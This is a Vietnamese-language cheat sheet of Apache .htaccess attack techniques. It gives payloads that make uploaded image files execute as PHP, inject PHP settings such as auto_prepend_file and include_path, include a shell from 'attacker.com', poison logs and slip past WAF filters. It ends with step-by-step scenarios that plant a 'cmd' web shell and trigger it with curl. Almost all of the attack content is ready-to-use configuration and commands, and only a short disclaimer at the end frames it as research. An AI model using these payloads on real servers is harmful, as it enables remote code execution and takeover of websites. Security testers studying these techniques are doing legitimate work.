# .htaccess Attack Vectors & Security Bypasses

Tài liệu tổng hợp các kỹ thuật tấn công thông qua file `.htaccess`, từ cơ bản đến nâng cao. Tài liệu này bao gồm các phương pháp khai thác file upload, injection cấu hình PHP, và các kỹ thuật bypass bộ lọc bảo mật.

## Mục lục
- [Phần 1: Cơ bản - Khai thác File Upload](#phần-1-cơ-bản---khai-thác-file-upload)
- [Phần 2: Trung cấp - PHP Config Injection](#phần-2-trung-cấp---php-config-injection)
- [Phần 3: Nâng cao - Kỹ thuật Bypass & Khai thác sâu](#phần-3-nâng-cao---kỹ-thuật-bypass--khai-thác-sâu)
- [Phần 4: Kịch bản tấn công thực tế](#phần-4-kịch-bản-tấn-công-thực-tế)
- [Lưu ý & Disclaimer](#lưu-ý--disclaimer)

---

## Phần 1: Cơ bản - Khai thác File Upload

Các kỹ thuật này thường được sử dụng khi bạn có thể upload file `.htaccess` lên server nhưng bị chặn upload file `.php`.

### 1.1 Thay đổi handler để thực thi file ảnh như PHP
Cho phép các file có đuôi mở rộng như `.jpg`, `.png`, `.txt` được xử lý như mã PHP.

```apache
# File: .htaccess
AddType application/x-httpd-php .jpg .png .gif .txt
```
*   **Giải thích:** `AddType` chỉ định MIME type cho extension.
*   **Ứng dụng:** Upload file `shell.jpg` chứa mã PHP, nó sẽ được thực thi.
*   **Hiệu quả:** Bypass filter chỉ cho phép upload ảnh.

### 1.2 SetHandler cơ bản
Sử dụng `SetHandler` để ép buộc xử lý file theo PHP engine.

```apache
<FilesMatch "shell\.(jpg|png|txt)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```
*   **Giải thích:** `FilesMatch` áp dụng rule cho các file khớp với regex.
*   **Ứng dụng:** Chỉ các file có tên khớp pattern (ví dụ `shell.jpg`) mới được thực thi như PHP.

### 1.3 ForceType
Buộc file được xử lý như PHP bất kể phần mở rộng là gì.

```apache
<Files "hack">
    ForceType application/x-httpd-php
</Files>
```
*   **Giải thích:** `ForceType` buộc file có MIME type là PHP.
*   **Ứng dụng:** File tên `hack` (không cần extension) cũng sẽ chạy như PHP.

---

## Phần 2: Trung cấp - PHP Config Injection

Thay đổi cấu hình PHP runtime thông qua `.htaccess` (yêu cầu `AllowOverride Options` hoặc tương đương).

### 2.1 PHP Value Injection

#### Kỹ thuật 1: auto_prepend_file
Tự động include một file trước khi bất kỳ script PHP nào chạy.

```apache
php_value auto_prepend_file "/etc/passwd"
# Hoặc
php_value auto_prepend_file "php://input"
```
*   **Giải thích:** `auto_prepend_file` tự động include file.
*   **Ứng dụng:** Đọc file hệ thống (`/etc/passwd`) hoặc chèn mã độc từ input stream.

#### Kỹ thuật 2: include_path
Thay đổi đường dẫn tìm kiếm file include.

```apache
php_value include_path "Z:/path/with/<?php system($_GET['cmd']); ?>"
```
*   **Giải thích:** PHP có thể parse đoạn code nằm trong đường dẫn `include_path`.

### 2.2 Remote File Inclusion (RFI)
Cấu hình để cho phép include file từ remote server.

```apache
php_flag allow_url_fopen On
php_flag allow_url_include On
php_value auto_prepend_file "http://attacker.com/shell.txt"
```
*   **Ưu điểm:** Không cần upload shell lên target server, load trực tiếp từ server của attacker.

### 2.3 Log Poisoning via .htaccess
Ghi mã độc vào log file và sau đó include log file đó.

```apache
php_value error_log "/var/www/html/shell.php"
php_value include_path "<?php system($_GET['cmd']); ?>"
# Hoặc
php_value error_log "/var/log/apache2/access.log"
```
*   **Quy trình:**
    1.  Chuyển hướng `error_log` đến một file có thể truy cập qua web hoặc file log hệ thống.
    2.  Tạo lỗi chứa payload (qua `include_path` hoặc request).
    3.  Include file log để thực thi mã (RCE).

---

## Phần 3: Nâng cao - Kỹ thuật Bypass & Khai thác sâu

### 3.1 Bypass Filter với Line Continuation
Sử dụng dấu `\` để ngắt dòng, bypass các bộ lọc WAF tìm kiếm từ khóa chính xác.

```apache
php_value auto_prepend_fi\
le "php://input"
php_value allow_url_incl\
ude On
```
*   **Giải thích:** Apache nối các dòng kết thúc bằng `\` lại với nhau khi parse config.

### 3.2 Chained Exploitation
Kết hợp nhiều directive để tạo ra vector tấn công mạnh hơn.

```apache
# Bước 1: Bật URL inclusion
php_flag allow_url_include On

# Bước 2: Chèn shell qua auto_append_file dùng wrapper data://
php_value auto_append_file "data://text/plain;base64,PD9waHAgZWNobyAnU2hlbGwgQWN0aXZhdGVkJzsgPz4="

# Bước 3: Thêm extension lạ
AddType application/x-httpd-php .phtml .phar .inc
```

### 3.3 Apache Expression & Header Injection
Sử dụng biểu thức điều kiện của Apache để chèn header độc hại.

```apache
<If "%{REQUEST_URI} =~ /test/">
    Header set X-Powered-By "<?php system('id'); ?>"
</If>
```
*   **Ứng dụng:** Có thể dẫn đến XSS hoặc Cache Poisoning.

### 3.4 Mod_Rewrite Exploitation
Sử dụng `mod_rewrite` để bắt tham số và thực thi.

```apache
RewriteEngine On
RewriteCond %{QUERY_STRING} ^cmd=(.*)$
RewriteRule ^.*$ - [E=CMD:%1]

<If "%{ENV:CMD} != ''">
    php_value auto_prepend_file "data://text/plain,<?php system(getenv('CMD')); ?>"
</If>
```
*   **Giải thích:** Lấy giá trị `cmd` từ query string, lưu vào biến môi trường `CMD`, sau đó dùng `auto_prepend_file` để thực thi.

### 3.5 Nested .htaccess (Double Layer)
```apache
# File .htaccess level 1
<Files ".hidden">
    ForceType application/x-httpd-php
</Files>

# File .hidden (thực chất là .htaccess level 2 chứa code PHP)
php_value auto_prepend_file "php://input"
```

---

## Phần 4: Kịch bản tấn công thực tế

### Kịch bản 1: Upload .htaccess + Shell
1.  **Upload .htaccess:**
    ```bash
    echo 'AddType application/x-httpd-php .jpg' > .htaccess
    ```
2.  **Upload shell ảnh:**
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
    ```
3.  **Thực thi:**
    ```bash
    curl 'http://target.com/uploads/shell.jpg?cmd=id'
    ```

### Kịch bản 2: Log Poisoning
1.  **Cấu hình .htaccess:**
    ```apache
    php_value error_log "/var/www/html/poison.php"
    php_value include_path "<?php system(\$_GET['c']); ?>"
    ```
2.  **Trigger lỗi:**
    ```bash
    curl 'http://target.com/?page=non_existent'
    ```
3.  **Thực thi:**
    ```bash
    curl 'http://target.com/poison.php?c=whoami'
    ```

---

## Lưu ý & Disclaimer

### Lưu ý khi kiểm thử:
*   Cần quyền ghi file `.htaccess` và thư mục phải có cấu hình `AllowOverride All` (hoặc ít nhất là `Options` và `FileInfo`).
*   Kiểm tra phiên bản Apache và các module được load (`mod_rewrite`, `mod_php`, v.v.).
*   Thường kết hợp với lỗ hổng File Upload.

### Disclaimer
Tài liệu này chỉ dành cho mục đích nghiên cứu bảo mật và giáo dục. Việc sử dụng các kỹ thuật này để tấn công hệ thống mà không có sự cho phép là bất hợp pháp.
